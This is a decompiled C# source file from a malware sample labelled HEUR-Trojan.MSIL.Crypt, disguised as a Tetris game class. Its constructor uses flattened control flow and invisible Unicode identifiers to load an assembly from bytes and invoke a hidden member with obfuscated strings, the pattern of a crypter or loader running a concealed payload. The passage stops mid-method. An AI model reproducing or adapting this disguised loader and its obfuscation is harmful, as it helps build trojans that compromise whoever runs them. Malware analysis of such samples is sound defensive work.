// Decompiled with JetBrains decompiler
// Type: Tetris.Demo
// Assembly: IPropertyVa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C23A2FEC-DAFF-46A7-87BE-130D61523A70
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c241ae9d95421c026e56410c707a74de57e2f05505a461af475510f3c8a4ccb4.exe

using Game.Elements;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Tetris.Elements;

namespace Tetris
{
  public class Demo : Game.Game
  {
    private int _dalay;
    private IContainer components = (IContainer) null;
    private static string LocalX = \u003CModule\u003E.\u200F‌‪‮⁫‍‫‎​‌‍‏​‍‏⁮‌‬‪⁪​‭‍‫‏⁮‫⁫‏‍​​‏⁭‫⁫‮‍‪⁫‮<string>(1414572791U);
    private static string LocalY = \u003CModule\u003E.\u202A‌‫⁫‫⁮⁫‍‫‮‮‍‭‭⁬⁯​‫‎‬⁫⁬⁬⁬⁪⁯‪⁪⁪​⁪⁫⁯‎⁯‬‫⁫‭⁪‮<string>(3928557405U);
    private static string LocalZ;
    private static string LocalA;
    private static string LocalB;
    private static string LocalC;
    private static string LocalD;
    private static string LocalE;
    private static string LocalF;
    private static string LocalG;
    private static string LocalH;
    private static string LocalI;
    private static string LocalJ;
    private string DDT = "";
    private static object AssemblyTitleAttribute;
    private Label label2;
    private Panel panel1;
    private Label lblLines;
    private PictureBox btnImage;

    public Demo()
    {
label_1:
      int num1 = 2051436864;
      string[] strArray;
      PropertyInfo propertyInfo;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1247755230)) % 11U)
        {
          case 0:
            strArray = new string[3];
            num1 = (int) num2 * 695490271 ^ -385824957;
            continue;
          case 1:
            this.Start_Game();
            num1 = (int) num2 * 1335721594 ^ -1750052523;
            continue;
          case 2:
            strArray[1] = \u003CModule\u003E.\u206C‮⁭‌‫⁪‍‏‫‎​⁫‬⁫‬⁭⁬⁯⁯‎‭⁭⁪⁮‭‎⁫‍‎⁫​⁬‫⁮⁮‪⁬​‍‭‮<string>(1094814605U);
            strArray[2] = \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(3162832618U);
            num1 = (int) num2 * 1915606879 ^ -1960089705;
            continue;
          case 3:
            goto label_1;
          case 4:
            propertyInfo = Demo.\u206C‎‮‪⁯‏‭‌‮⁭‮⁮‍⁪​​‮‎‫‎⁬⁭‮‍‍‮⁪‪⁫‮⁮‭⁫‏‏⁫‮‫⁭‌‮((System.Type) Demo.AssemblyTitleAttribute)[0];
            num1 = (int) num2 * 71811719 ^ 1274694131;
            continue;
          case 5:
            this.InitializeComponent();
            num1 = (int) num2 * -50464040 ^ 2114846906;
            continue;
          case 6:
            strArray[0] = \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(2790623726U);
            num1 = (int) num2 * 855386436 ^ 2040025190;
            continue;
          case 7:
            Demo.\u200E‪⁭⁪‎⁪‮‍⁯⁮⁮‬‬‬⁪‭‪‍⁯‎⁮‫‪​⁪‫⁯⁭‎​⁪‬‮⁯‍‪‏⁪‏‌‮(propertyInfo, (object) null, (object) strArray, (object[]) null);
            this.Initialize();
            num1 = (int) num2 * -226508938 ^ -1834921931;
            continue;
          case 8:
            num1 = (int) num2 * -922417287 ^ -1155670814;
            continue;
          case 9:
            num1 = (int) num2 * -1133800107 ^ -1978875558;
            continue;
          case 10:
            goto label_3;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    public Tetris.Elements.Resources Resources { get; set; }

    public Board Board { get; set; }

    public List<Block> Blocks { get; set; }

    public Block CurrentBlock { get; set; }

    public bool Playing { get; set; }

    private void btnLink_Click(object sender, EventArgs e)
    {
label_1:
      int num1 = 13759528;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 207554243)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            this.Open_ZeroSoft_URL();
            num1 = (int) num2 * -1484119426 ^ 151946090;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void Initialize()
    {
label_1:
      int num1 = 1954189356;
      string str;
      Size size;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 934145351)) % 4U)
        {
          case 0:
            this.Resources = new Tetris.Elements.Resources()
            {
              Block_Blue = this.Load_Image(Demo.\u200C‫‎‌⁪⁮⁮⁯‬​​‏‪⁫‪⁪‌⁪‎‫‌‬‌‪‏​‮‮‍‫‭​‬‬‍‮⁫‍⁬‍‮(str, \u003CModule\u003E.\u200F‌‪‮⁫‍‫‎​‌‍‏​‍‏⁮‌‬‪⁪​‭‍‫‏⁮‫⁫‏‍​​‏⁭‫⁫‮‍‪⁫‮<string>(1263200716U))),
              Block_Cyan = this.Load_Image(Demo.\u200C‫‎‌⁪⁮⁮⁯‬​​‏‪⁫‪⁪‌⁪‎‫‌‬‌‪‏​‮‮‍‫‭​‬‬‍‮⁫‍⁬‍‮(str, \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(592972707U))),
              Block_Green = this.Load_Image(Demo.\u200C‫‎‌⁪⁮⁮⁯‬​​‏‪⁫‪⁪‌⁪‎‫‌‬‌‪‏​‮‮‍‫‭​‬‬‍‮⁫‍⁬‍‮(str, \u003CModule\u003E.\u202A‌‫⁫‫⁮⁫‍‫‮‮‍‭‭⁬⁯​‫‎‬⁫⁬⁬⁬⁪⁯‪⁪⁪​⁪⁫⁯‎⁯‬‫⁫‭⁪‮<string>(60010203U))),
              Block_Orange = this.Load_Image(Demo.\u200C‫‎‌⁪⁮⁮⁯‬​​‏‪⁫‪⁪‌⁪‎‫‌‬‌‪‏​‮‮‍‫‭​‬‬‍‮⁫‍⁬‍‮(str, \u003CModule\u003E.\u200F‌‪‮⁫‍‫‎​‌‍‏​‍‏⁮‌‬‪⁪​‭‍‫‏⁮‫⁫‏‍​​‏⁭‫⁫‮‍‪⁫‮<string>(1812726913U))),
              Block_Red = this.Load_Image(Demo.\u200C‫‎‌⁪⁮⁮⁯‬​​‏‪⁫‪⁪‌⁪‎‫‌‬‌‪‏​‮‮‍‫‭​‬‬‍‮⁫‍⁬‍‮(str, \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(2520906995U))),
              Block_Violet = this.Load_Image(Demo.\u200C‫‎‌⁪⁮⁮⁯‬​​‏‪⁫‪⁪‌⁪‎‫‌‬‌‪‏​‮‮‍‫‭​‬‬‍‮⁫‍⁬‍‮(str, \u003CModule\u003E.\u202A‌‫⁫‫⁮⁫‍‫‮‮‍‭‭⁬⁯​‫‎‬⁫⁬⁬⁬⁪⁯‪⁪⁪​⁪⁫⁯‎⁯‬‫⁫‭⁪‮<string>(2844633195U))),
              Block_Yellow = this.Load_Image(Demo.\u200C‫‎‌⁪⁮⁮⁯‬​​‏‪⁫‪⁪‌⁪‎‫‌‬‌‪‏​‮‮‍‫‭​‬‬‍‮⁫‍⁬‍‮(str, \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(4246014380U)))
            };
            size = new Size(40, 40);
            num1 = (int) num2 * -2088289586 ^ -2111211378;
            continue;
          case 2:
            goto label_1;
          case 3:
            str = Demo.\u206A⁯‮‬‭‪⁬‏‮‭‏⁪‮⁬⁭‫‪⁭‏‭‌​‪‎‏‪‏‍⁮⁫⁬‍⁫‪‫‮⁮⁫‍‮(Demo.\u206F⁯⁭⁬‪‍⁫‏‬‫‏⁯‎‎‭‏⁬‬⁬‫⁮​⁪‮⁮​‪‪⁭​⁮⁯‎⁫‌‮⁫‬‎‬‮(Demo.\u200E‎‫⁮‎‬‍‪⁮‭‭‫‮‌‌⁮‪⁫⁯‫⁬‭⁭‬‬‫⁫⁭‍‌‪⁬‍⁬‭‮‪⁮‏⁬‮()), \u003CModule\u003E.\u206C‮⁭‌‫⁪‍‏‫‎​⁫‬⁫‬⁭⁬⁯⁯‎‭⁭⁪⁮‭‎⁫‍‎⁫​⁬‫⁮⁮‪⁬​‍‭‮<string>(163472350U));
            num1 = (int) num2 * 167358281 ^ 184426292;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      this.Blocks = new List<Block>()
      {
        (Block) new Block_Blue(this.Resources.Block_Blue, size),
        (Block) new Block_Cyan(this.Resources.Block_Cyan, size),
        (Block) new Block_Green(this.Resources.Block_Green, size),
        (Block) new Block_Orange(this.Resources.Block_Orange, size),
        (Block) new Block_Red(this.Resources.Block_Red, size),
        (Block) new Block_Violet(this.Resources.Block_Violet, size),
        (Block) new Block_Yellow(this.Resources.Block_Yellow, size)
      };
    }

    private void Start_Game()
    {
      this.Board = new Board(this.Resources);
label_1:
      int num1 = 47773425;
      Size size;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1384234557)) % 7U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 568132369 ^ -1903755671;
            continue;
          case 2:
            Demo.\u206B‌‮​‪‎‪‌⁬‎⁫⁬‬‭‎⁫⁬‪⁪‎⁬‬⁭‭‏⁯⁫⁮‮⁫‭⁭⁪‎‏‪‌⁬⁭‍‮((Control) this, size = Demo.\u200E​⁯‮‭⁫‪⁬‭⁮‫‏​⁭​⁬‮‏‌‫⁫‎‬‪‍⁪​‬⁫‮‪⁫‭‫⁮​⁫⁪⁮‬‮((Form) this));
            Demo.\u202B⁫‍‌‍‬‮⁯⁪​‌‪⁬⁬⁫⁯‭⁮‬‭‫‎​‏⁫‪‬‍‏‌‫‌‍‪‏‎‍⁪⁮⁬‮((Control) this, size);
            num1 = (int) num2 * -142987660 ^ 1352082972;
            continue;
          case 3:
            goto label_1;
          case 4:
            int width = Demo.\u206C‭⁮‌‎​⁭⁪‌⁬⁭‏‍‮‍⁮⁬​‌⁪‮‍‎‬‫‮⁭‬‭⁭​‏⁫⁪⁮‭⁮⁪‫‌‮((Control) this);
            size = this.Board.Grid_Size;
            int height1 = size.Height;
            size = this.Board.Block_Size;
            int height2 = size.Height;
            int height3 = height1 * height2;
            Demo.\u200E‎‬‏⁯‏‎‬‪⁭‎⁯‏⁫⁭⁪⁬‫‪⁬‫⁭⁮​‏‏⁮‫‬‍⁯‬‮‪‭‭⁬‬‭⁮‮((Form) this, new Size(width, height3));
            num1 = (int) num2 * -1840101794 ^ 375910053;
            continue;
          case 5:
            this.Playing = true;
            num1 = (int) num2 * -1070321218 ^ -799416576;
            continue;
          case 6:
            this.CurrentBlock = (Block) null;
            num1 = (int) num2 * 167273913 ^ -592190604;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:;
    }

    private void Next_Block()
    {
label_1:
      int num1 = 1935309339;
      while (true)
      {
        uint num2;
        bool flag1;
        bool flag2;
        int num3;
        switch ((num2 = (uint) (num1 ^ 181483405)) % 16U)
        {
          case 0:
            num1 = 1410899702;
            continue;
          case 1:
            this.CurrentBlock = this.Blocks[Demo.\u200D⁪⁯‎‮⁭‮‪⁯​⁯‮‎‭​‌‭‍‮⁬⁮‏⁫⁬‫⁭⁭‌⁪‭‎⁭‏‪⁮⁫⁯⁮‍⁮‮(Demo.\u206A‏⁫⁫‌⁯‍‎‬‬‪‪‮⁮​​⁭‫‎⁯‍⁭‌⁭‎⁫​​‬‪‬⁪​‭‏‌‬⁬‌‌‮(DateTime.Now.Millisecond), 0, 7)];
            num1 = (int) num2 * -1775800270 ^ -120037284;
            continue;
          case 2:
            num1 = (int) num2 * 616435017 ^ -1040840254;
            continue;
          case 3:
            Block currentBlock = this.CurrentBlock;
            Size size = this.Board.Grid_Size;
            int num4 = size.Width / 2;
            size = this.CurrentBlock.Matrix_Size;
            int num5 = size.Width / 2;
            Point point = new Point(num4 - num5, 0);
            currentBlock.Location = point;
            num1 = (int) num2 * 62301458 ^ -308057532;
            continue;
          case 4:
            int num6 = !flag1 ? -323441042 : (num6 = -1350790270);
            num1 = num6 ^ (int) num2 * 1454203710;
            continue;
          case 5:
            if (!this.Board.BlockCollition(this.CurrentBlock, Point.Empty))
            {
              num1 = (int) num2 * -252937738 ^ -1277116049;
              continue;
            }
            num3 = 1;
            break;
          case 6:
            flag1 = this.CurrentBlock == null;
            num1 = (int) num2 * -1416718418 ^ 889355853;
            continue;
          case 7:
            num1 = (int) num2 * 2072889113 ^ -24666829;
            continue;
          case 8:
            num1 = (int) num2 * 1145190506 ^ 662562584;
            continue;
          case 9:
            this.Playing = false;
            int num7 = (int) Demo.\u200D‮‎‌‎⁬‏⁪‫​⁯⁬⁫‍‪⁮‌‪‎​‫​‮⁯‏​‪⁭‎‍​‮⁬‭⁯‌‭​‎‫‮(\u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(1912426286U));
            this.Start_Game();
            num1 = (int) num2 * -30324077 ^ -647773004;
            continue;
          case 10:
            goto label_1;
          case 11:
            goto label_3;
          case 12:
            num3 = this.Board.BlockCollition(this.CurrentBlock, new Point(0, 1)) ? 1 : 0;
            break;
          case 13:
            num1 = (int) num2 * -1938434739 ^ -1933696636;
            continue;
          case 14:
            int num8 = !flag2 ? -1279366475 : (num8 = -1031939588);
            num1 = num8 ^ (int) num2 * 1020251044;
            continue;
          case 15:
            this.CurrentBlock.SetDefault();
            num1 = (int) num2 * -192217632 ^ -410121803;
            continue;
          default:
            goto label_21;
        }
        flag2 = num3 != 0;
        num1 = 683003315;
      }
label_3:
      return;
label_21:;
    }

    private void MoveDown_Piece()
    {
label_1:
      int num1 = 72266025;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 565520600)) % 12U)
        {
          case 0:
            num1 = (int) num2 * 569809388 ^ 92242796;
            continue;
          case 1:
            flag1 = this.CurrentBlock == null;
            num1 = (int) num2 * 740602958 ^ -1535694350;
            continue;
          case 2:
            this._dalay = 0;
            Block currentBlock = this.CurrentBlock;
            Point location = this.CurrentBlock.Location;
            int x = location.X;
            location = this.CurrentBlock.Location;
            int y = location.Y + 1;
            Point point = new Point(x, y);
            currentBlock.Location = point;
            num1 = (int) num2 * -860139819 ^ -27538489;
            continue;
          case 3:
            int num3 = !flag2 ? -1431603921 : (num3 = -897783786);
            num1 = num3 ^ (int) num2 * 646229947;
            continue;
          case 4:
            int num4 = flag1 ? -934881985 : (num4 = -1750938030);
            num1 = num4 ^ (int) num2 * -2082641218;
            continue;
          case 5:
            this.Valid_DownCollition();
            num1 = (int) num2 * -1462737461 ^ 1540527747;
            continue;
          case 6:
            goto label_3;
          case 7:
            num1 = (int) num2 * 1325147765 ^ -302432027;
            continue;
          case 8:
            num1 = (int) num2 * 30343842 ^ 65908794;
            continue;
          case 9:
            goto label_1;
          case 10:
            flag2 = this._dalay >= 500;
            num1 = 303773855;
            continue;
          case 11:
            num1 = (int) num2 * 1042241267 ^ -100796385;
            continue;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:;
    }

    private void MoveSide_Piece(int moveValue)
    {
      bool flag1 = this.CurrentBlock == null;
label_1:
      int num1 = 717638673;
      int index1;
      Point point;
      Point location1;
      int index2;
      Size size;
      bool flag2;
      int num2;
      bool flag3;
      Point location2;
      bool flag4;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1699491170)) % 26U)
        {
          case 0:
            index1 = 0;
            num1 = 1808123530;
            continue;
          case 1:
            num1 = (int) num3 * 877450066 ^ -2110882104;
            continue;
          case 2:
            location1 = this.CurrentBlock.Location;
            int x1 = location1.X;
            size = this.CurrentBlock.Matrix_Size;
            int width1 = size.Width;
            int num4 = x1 + width1 + moveValue;
            size = this.Board.Grid_Size;
            int width2 = size.Width;
            int num5;
            num1 = num5 = num4 > width2 ? 42140464 : (num5 = 1410481979);
            continue;
          case 3:
            int num6 = index2;
            size = this.CurrentBlock.Matrix_Size;
            int height = size.Height;
            flag2 = num6 < height;
            num1 = 199507617;
            continue;
          case 4:
            ++index2;
            num1 = (int) num3 * -1386279591 ^ -1121127173;
            continue;
          case 5:
            int num7 = flag2 ? 784701236 : (num7 = 18371793);
            num1 = num7 ^ (int) num3 * -8812948;
            continue;
          case 6:
            location1 = this.CurrentBlock.Location;
            int num8;
            num1 = num8 = location1.X + moveValue < 0 ? 32214141 : (num8 = 316561590);
            continue;
          case 7:
            int num9 = !flag4 ? -2133361624 : (num9 = -2115389579);
            num1 = num9 ^ (int) num3 * -58149057;
            continue;
          case 8:
            location2 = new Point(point.X + index1, point.Y + index2);
            num1 = (int) num3 * 770201502 ^ 1231070808;
            continue;
          case 9:
            num1 = 1279284745;
            continue;
          case 10:
            goto label_1;
          case 11:
            int num10 = index1;
            size = this.CurrentBlock.Matrix_Size;
            int width3 = size.Width;
            int num11;
            num1 = num11 = num10 >= width3 ? 1670695310 : (num11 = 978623055);
            continue;
          case 12:
            goto label_3;
          case 13:
            num2 = this.CurrentBlock.Matrix[index2, index1];
            num1 = 2053910400;
            continue;
          case 14:
            num1 = (int) num3 * 1802376283 ^ 1532161038;
            continue;
          case 15:
            this.CurrentBlock.Location = point;
            num1 = (int) num3 * 1205845655 ^ -255617473;
            continue;
          case 16:
            num1 = (int) num3 * 998063817 ^ 1446891031;
            continue;
          case 17:
            ++index1;
            num1 = 797550399;
            continue;
          case 18:
            flag3 = this.Board.HasBlock(location2);
            num1 = (int) num3 * -898720343 ^ 825461947;
            continue;
          case 19:
            int num12 = flag3 ? -197610895 : (num12 = -381741192);
            num1 = num12 ^ (int) num3 * -1861641667;
            continue;
          case 20:
            flag4 = num2 > 0;
            num1 = (int) num3 * -1622197153 ^ 1225130531;
            continue;
          case 21:
            num1 = (int) num3 * -222997588 ^ -171677670;
            continue;
          case 22:
            this.Valid_DownCollition();
            num1 = (int) num3 * 1732186497 ^ -461920822;
            continue;
          case 23:
            ref Point local = ref point;
            location1 = this.CurrentBlock.Location;
            int x2 = location1.X + moveValue;
            location1 = this.CurrentBlock.Location;
            int y = location1.Y;
            local = new Point(x2, y);
            index2 = 0;
            num1 = 1773627127;
            continue;
          case 24:
            num1 = (int) num3 * -1587635079 ^ -270628124;
            continue;
          case 25:
            int num13 = flag1 ? 809047487 : (num13 = 682222842);
            num1 = num13 ^ (int) num3 * 1142492432;
            continue;
          default:
            goto label_28;
        }
      }
label_3:
      return;
label_28:;
    }

    private void Valid_DownCollition()
    {
label_1:
      int num1 = 1440164125;
      while (true)
      {
        uint num2;
        int num3;
        switch ((num2 = (uint) (num1 ^ 971612347)) % 10U)
        {
          case 0:
            goto label_3;
          case 1:
            this.Board.Add_Block(this.CurrentBlock);
            num1 = (int) num2 * 613272583 ^ 1802338718;
            continue;
          case 2:
            this.Board.CheckLines();
            num1 = (int) num2 * 2107174920 ^ 2002990542;
            continue;
          case 3:
            num1 = (int) num2 * 832030842 ^ -373867528;
            continue;
          case 4:
            num1 = (int) num2 * -1429106637 ^ 1494411985;
            continue;
          case 5:
            this.CurrentBlock = (Block) null;
            num1 = (int) num2 * 680516718 ^ 379540345;
            continue;
          case 6:
            num3 = this.Board.BlockCollition(this.CurrentBlock, new Point(0, 1)) ? 1 : 0;
            break;
          case 7:
            num1 = (int) num2 * 1982567938 ^ -617879340;
            continue;
          case 8:
            if (this.CurrentBlock == null)
            {
              num3 = 0;
              break;
            }
            num1 = (int) num2 * -433017632 ^ -454488737;
            continue;
          case 9:
            goto label_1;
          default:
            goto label_15;
        }
        int num4;
        num1 = num4 = num3 == 0 ? 199347541 : (num4 = 715520708);
      }
label_3:
      return;
label_15:;
    }

    private void Force_Down()
    {
label_1:
      int num1 = -261526868;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -828105141)) % 9U)
        {
          case 0:
            flag = this.CurrentBlock != null;
            num1 = -1618294671;
            continue;
          case 1:
            num1 = (int) num2 * 303401586 ^ -1606460844;
            continue;
          case 2:
            this.Valid_DownCollition();
            num1 = (int) num2 * -334272105 ^ -2118239453;
            continue;
          case 3:
            int num3 = !flag ? -503234527 : (num3 = -81176030);
            num1 = num3 ^ (int) num2 * -1372768840;
            continue;
          case 4:
            num1 = -1520314087;
            continue;
          case 5:
            num1 = (int) num2 * -1608263202 ^ 667584952;
            continue;
          case 6:
            Block currentBlock = this.CurrentBlock;
            Point location = this.CurrentBlock.Location;
            int x = location.X;
            location = this.CurrentBlock.Location;
            int y = location.Y + 1;
            Point point = new Point(x, y);
            currentBlock.Location = point;
            num1 = (int) num2 * -2048875304 ^ 290295995;
            continue;
          case 7:
            goto label_1;
          case 8:
            goto label_3;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:;
    }

    protected override void Update(GameTime gameTime)
    {
label_1:
      int num1 = -1334546112;
      bool up;
      bool flag;
      bool space;
      bool down;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1953772755)) % 31U)
        {
          case 0:
            num1 = (int) num2 * -1773206177 ^ 1404692509;
            continue;
          case 1:
            this.Board.Rotate(this.CurrentBlock, -1);
            this.Valid_DownCollition();
            num1 = (int) num2 * -1045454258 ^ 1526835958;
            continue;
          case 2:
            int num3 = !this.Keyboard.Right ? -1080994659 : (num3 = -311484567);
            num1 = num3 ^ (int) num2 * 87757878;
            continue;
          case 3:
            goto label_3;
          case 4:
            up = this.Keyboard.Up;
            num1 = -835626349;
            continue;
          case 5:
            int num4 = up ? -279177446 : (num4 = -1825373359);
            num1 = num4 ^ (int) num2 * -1680230599;
            continue;
          case 6:
            num1 = (int) num2 * -408767431 ^ -1707496443;
            continue;
          case 7:
            space = this.Keyboard.Space;
            num1 = -1163489259;
            continue;
          case 8:
            num1 = (int) num2 * 136922715 ^ 1211500234;
            continue;
          case 9:
            num1 = (int) num2 * -2024449450 ^ -255175623;
            continue;
          case 10:
            num1 = (int) num2 * 1230724850 ^ -838772842;
            continue;
          case 11:
            num1 = (int) num2 * -888826163 ^ 1457185183;
            continue;
          case 12:
            this._dalay += gameTime.FrameMilliseconds;
            num1 = -1813816275;
            continue;
          case 13:
            flag = !this.Playing;
            num1 = (int) num2 * -1854306879 ^ 122243502;
            continue;
          case 14:
            int num5 = !down ? 2038269441 : (num5 = 1702754535);
            num1 = num5 ^ (int) num2 * 1969300998;
            continue;
          case 15:
            int num6 = !space ? 1892575154 : (num6 = 1032757083);
            num1 = num6 ^ (int) num2 * 477044847;
            continue;
          case 16:
            num1 = (int) num2 * -1650641012 ^ -55860610;
            continue;
          case 17:
            Demo.\u200E⁮‍‭‪⁫‌‍‏⁯⁬⁭⁪‎⁯‌⁮⁯‫⁭​‮⁫‪⁮⁪‎‫‪⁪‭‭⁭‬⁪⁯‭‏⁮⁬‮((Control) this.lblLines, this.Board.Lines.ToString());
            num1 = -1274573918;
            continue;
          case 18:
            goto label_1;
          case 19:
            int num7;
            num1 = num7 = this.Keyboard.Left ? -2119940505 : (num7 = -1112237577);
            continue;
          case 20:
            this.MoveDown_Piece();
            num1 = (int) num2 * 216346265 ^ -1752085014;
            continue;
          case 21:
            this.Next_Block();
            num1 = (int) num2 * 1584885788 ^ 1760628492;
            continue;
          case 22:
            this.Valid_DownCollition();
            num1 = (int) num2 * 721635587 ^ 1057862959;
            continue;
          case 23:
            down = this.Keyboard.Down;
            num1 = -1210856182;
            continue;
          case 24:
            this.Board.Rotate(this.CurrentBlock, 1);
            num1 = (int) num2 * -822576439 ^ 495040565;
            continue;
          case 25:
            this.MoveSide_Piece(1);
            num1 = (int) num2 * 1426767674 ^ -1766218898;
            continue;
          case 26:
            int num8 = flag ? -745156316 : (num8 = -490960636);
            num1 = num8 ^ (int) num2 * -519639062;
            continue;
          case 27:
            num1 = (int) num2 * 1324588317 ^ 24387167;
            continue;
          case 28:
            this.Force_Down();
            num1 = (int) num2 * 675037232 ^ -1132689301;
            continue;
          case 29:
            num1 = (int) num2 * -1854874730 ^ 1995892360;
            continue;
          case 30:
            this.MoveSide_Piece(-1);
            num1 = (int) num2 * 1050092983 ^ -1984019952;
            continue;
          default:
            goto label_33;
        }
      }
label_3:
      return;
label_33:;
    }

    public override void Draw(DrawHandler drawHandler)
    {
      this.Board.Draw(drawHandler);
label_1:
      int num1 = 422292653;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 780154224)) % 6U)
        {
          case 0:
            int num3 = this.CurrentBlock == null ? 1749774774 : (num3 = 1689521423);
            num1 = num3 ^ (int) num2 * 1859655562;
            continue;
          case 1:
            this.CurrentBlock.Draw(drawHandler);
            num1 = (int) num2 * 1389497431 ^ 1093188464;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 1958262525 ^ -2073424177;
            continue;
          case 4:
            goto label_3;
          case 5:
            num1 = (int) num2 * -1925806884 ^ 188383270;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    protected override void Dispose(bool disposing)
    {
label_1:
      int num1 = 1070099922;
      while (true)
      {
        uint num2;
        int num3;
        switch ((num2 = (uint) (num1 ^ 1677753960)) % 10U)
        {
          case 0:
            base.Dispose(disposing);
            num1 = 976040255;
            continue;
          case 1:
            num1 = (int) num2 * 151313113 ^ 1846792236;
            continue;
          case 2:
            num3 = this.components != null ? 1 : 0;
            break;
          case 3:
            Demo.\u206F⁫‪‭‪‎‪‏‪‍⁭‌‭⁭‬⁪⁮⁮‎‮‍‭‍⁬⁫‫‫⁮‏​‍​‬⁫⁭⁫⁯‪‍‬‮((IDisposable) this.components);
            num1 = (int) num2 * -980227275 ^ -1711422308;
            continue;
          case 4:
            goto label_3;
          case 5:
            num1 = (int) num2 * -890013762 ^ -1130099608;
            continue;
          case 6:
            if (!disposing)
            {
              num3 = 0;
              break;
            }
            num1 = (int) num2 * 89568802 ^ -1343992182;
            continue;
          case 7:
            goto label_1;
          case 8:
            num1 = (int) num2 * 678529564 ^ -1186561888;
            continue;
          case 9:
            num1 = (int) num2 * 627215155 ^ -111490193;
            continue;
          default:
            goto label_15;
        }
        int num4;
        num1 = num4 = num3 != 0 ? 1182491985 : (num4 = 1539333344);
      }
label_3:
      return;
label_15:;
    }

    private static void IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII(byte[] KeySpec) => Demo.MessageData(Demo.IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII(KeySpec));

    private static Assembly IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII(
      byte[] Field)
    {
      Assembly assembly = Demo.\u200F‍⁮⁬‎⁪⁪⁫​‪‫​‌‫‍‮‏​‎⁬‮⁯⁫‮‮‪⁪‬‪‌‎⁫‎​⁫​‮‭‍⁪‮(Field);
label_1:
      int num1 = 1272021653;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1539129660)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 819323241 ^ -875618769;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return assembly;
    }

    private static void MessageData(Assembly TwoDigitYearMax) => Demo.AssemblyTitleAttribute = (object) Demo.\u206D⁭‌⁭‎⁭‬‎‏‮⁭‬‏‏⁪‎‌‬‍⁯‫‪‏‎⁮‫‌⁪⁪‍‌⁪‫⁯‮⁭⁯⁭‍‪‮(TwoDigitYearMax, \u003CModule\u003E.\u200E⁯‪‎⁬‪⁪‍⁮‍‎‏‏‎‍⁯⁪⁮⁯⁭‫⁫‫‎‍‏​‬⁬⁫‎⁯​⁪‪‫⁯‮⁬⁫‮<string>(211016625U));

    private void InitializeComponent()
    {
      // ISSUE: type reference
      ComponentResourceManager componentResourceManager = Demo.\u202B‫⁮‏‪⁪​⁫⁫‮⁮‎​‫⁮⁯⁮‫‮‬‎⁮‌‎⁫⁬‍‏⁮‫‫‬‬⁫‪‌⁬‭‪‭‮(Demo.\u200C‎‍‫​‌⁪​‌‌‪⁯⁭‏‌‭‍⁬⁭‏‎‫⁪‍‌‎‍‌⁯‏​⁪‌‎‪⁫⁪‭⁪‪‮(__typeref (Demo)));
      this.label2 = Demo.\u206B⁯‪⁬‫⁫‎‭⁭⁫‌‮⁮⁪‬‮‌‍‎​‪⁭‏‎⁯⁫‮⁫‫‭⁮⁯⁬⁭‭⁭‫⁮‭‪‮();
      this.panel1 = Demo.\u202C⁫‫‪‪‌‍⁪‍⁯‎⁮⁭⁬⁫‮‬‍⁬‌‌⁮‫‌⁮⁫‫​‏‏⁪‬‬⁭⁬⁯‎‏​‭‮();
label_1:
      int num1 = 790216637;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 986623937)) % 29U)
        {
          case 0:
            num1 = (int) num2 * -1478279195 ^ -743968401;
            continue;
          case 1:
